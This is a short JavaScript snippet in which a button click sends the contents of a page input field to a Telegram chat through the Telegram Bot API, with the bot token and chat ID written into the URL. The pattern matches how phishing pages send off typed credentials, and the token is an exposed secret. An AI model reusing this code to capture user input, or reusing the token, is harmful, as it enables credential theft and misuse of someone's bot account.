butt.onclick = function () {
  var val = document.getElementById("elem1").value;

  var getPageList = new XMLHttpRequest();
  getPageList.open(
    "POST",
    "https://api.telegram.org/bot1403106172:AAF0cYqbdUgpDOQqllWvZTo1vOfUUNoDvo4/sendMessage?chat_id=-1001077685352&text=" +
      val,
    true
  );

  getPageList.send(null);
};
